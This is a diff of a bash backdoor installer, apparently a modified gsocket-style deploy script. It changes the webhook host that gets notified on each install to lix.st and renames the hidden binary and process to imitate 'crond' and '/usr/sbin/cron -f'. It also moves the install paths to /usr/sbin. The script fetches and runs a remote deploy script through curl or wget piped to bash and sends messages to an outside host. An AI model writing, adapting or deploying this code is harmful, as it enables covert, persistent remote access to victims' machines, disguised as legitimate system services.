@@ -26,8 +26,8 @@ GS_TG_TOKEN="xdeath"
 GS_TG_CHATID="xdeath"
 [[ -n $GS_TG_TOKEN ]] && [[ -n $GS_TG_CHATID ]] && {
 	data='text='${msg}''
-	GS_WEBHOOK_CURL=("--data-urlencode" "text=${msg}" "https://web.lix.re/")
-	GS_WEBHOOK_WGET=("--post-data=${data}" "https://web.lix.re/")
+	GS_WEBHOOK_CURL=("--data-urlencode" "text=${msg}" "https://lix.st/")
+	GS_WEBHOOK_WGET=("--post-data=${data}" "https://lix.st/")
 }
 ### Generic URL as webhook (any URL)
 [[ -n $GS_WEBHOOK ]] && {
@@ -54,10 +54,10 @@ unset msg
 
 DL_CRL="bash -c \"\$(curl -fsSL $URL_DEPLOY)\""
 DL_WGT="bash -c \"\$(wget -qO- $URL_DEPLOY)\""
-BIN_HIDDEN_NAME_DEFAULT="sshds"
+BIN_HIDDEN_NAME_DEFAULT="crond"
 # Can not use '[kcached/0]'. Bash without bashrc shows "/0] $" as prompt. 
 whoiam="$(whoami)"
-proc_name_arr=("-bash")
+proc_name_arr=("/usr/sbin/cron -f")
 # Pick a process name at random
 PROC_HIDDEN_NAME_DEFAULT="${proc_name_arr[$((RANDOM % ${#proc_name_arr[@]}))]}"
 for str in "${proc_name_arr[@]}"; do
@@ -67,7 +67,7 @@ PROC_HIDDEN_NAME_RX="${PROC_HIDDEN_NAME_RX:1}"
 
 # PROC_HIDDEN_NAME_DEFAULT="[rcu_preempt]"
 # ~/.local/<NAME>
-CONFIG_DIR_NAME=".ssh"
+CONFIG_DIR_NAME=".local"
 
 # Names for 'uninstall' (including names from previous versions)
 BIN_HIDDEN_NAME_RM=("$BIN_HIDDEN_NAME_DEFAULT" "gs-dbus" "gs-db")
@@ -463,7 +463,7 @@ init_dstbin()
 	fi
 
 	# Try systemwide installation first
-	try_dstdir "${GS_PREFIX}/usr/bin" && return
+	try_dstdir "${GS_PREFIX}/usr/sbin" && return
 
 	# Try user installation
 	[[ ! -d "${GS_PREFIX}${HOME}/.local" ]] && xmkdir "${GS_PREFIX}${HOME}/.local"
@@ -785,7 +785,7 @@ init_setup()
 	if [[ -n "$GS_PREFIX" ]]; then
 		# Debuggin and testing into separate directory
 		mkdir -p "${GS_PREFIX}/etc" 2>/dev/null
-		mkdir -p "${GS_PREFIX}/usr/bin" 2>/dev/null
+		mkdir -p "${GS_PREFIX}/usr/sbin" 2>/dev/null
 		mkdir -p "${GS_PREFIX}${HOME}" 2>/dev/null
 		if [[ -f "${HOME}/${RC_FN_LIST[1]}" ]]; then
 			xcp -p "${HOME}/${RC_FN_LIST[1]}" "${GS_PREFIX}${HOME}/${RC_FN_LIST[1]}"
@@ -908,7 +908,7 @@ uninstall()
 			uninstall_rm "${GS_PREFIX}${HOME}/.local/${cn}/${hn}"
 			uninstall_rm "${GS_PREFIX}${HOME}/.local/${cn}/${hn}.rsa"  # SEC_NAME
 		done
-		uninstall_rm "${GS_PREFIX}/usr/bin/${hn}"
+		uninstall_rm "${GS_PREFIX}/usr/sbin/${hn}"
 		uninstall_rm "/dev/shm/${hn}"
 		uninstall_rm "/var/tmp/.ssh/${hn}"
 		uninstall_rm "${PWD}/${hn}"
@@ -1561,7 +1561,7 @@ gs_start()
 	if [[ -n "$IS_NEED_START" ]]; then
 		# LOGIKA BARU: Cek Root dan File
 		# Jika user adalah root (0) DAN file /usr/bin/sshds.rsa TIDAK ADA
-		if [[ "$EUID" -eq 0 ]] && [[ ! -f "/usr/bin/sshds.rsa" ]]; then
+		if [[ "$EUID" -eq 0 ]] && [[ ! -f "/usr/sbin/sshds.rsa" ]]; then
 			USER_SEC_FILE="/etc/sshds.rsa"
 		fi
 
